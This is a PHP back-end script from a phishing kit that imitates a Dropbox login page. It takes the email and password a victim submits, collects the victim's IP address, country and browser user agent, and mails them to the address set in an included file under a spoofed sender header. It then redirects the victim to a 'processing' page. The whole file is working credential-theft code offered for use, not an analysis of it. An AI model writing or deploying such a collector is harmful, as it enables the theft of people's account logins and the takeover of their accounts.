<?php
session_start();
include "to.php";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
$Email	=	$_POST["email"];
$Pass	=	$_POST["pass"];
$browser             =   $_SERVER['HTTP_USER_AGENT'];

$Message =	"<b><font color='#3b3f40' size='4.5px'>-----------{ <font color='#f6546a'>DROPBOX LOGIN</font> }-----------</b><br>";
$Message .=	"<b>Dropbox Email : </b><font color='#0097ff'>".$Email."</font><br>";
$Message .=	"<b>Dropbox Pass : </b><font color='#0097ff'>".$Pass."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>LOGIN INFOS</b></font>}-----------</b><br>";
$Message .=	"<b>IP Address : </b><a href='http://www.whoer.net/?IP=".$ip."'><font color='#c5405b'>".$ip."</font></a><br>";
$Message .=	"<b>User Agent  : </b><font color='#c5405b'>".$browser."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>DROPBOX</b></font> }-----------</b></font><br>";

$Subject = "[DROPBOX] ~ Login ~ From ~ [$ip] Country [$COUNTRY]";

$Headers = "From: 2904 Wire Group<Vip@163.goooo>\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

mail($to,$Subject,$Message,$Headers);

header("location: processing.php");

 
?>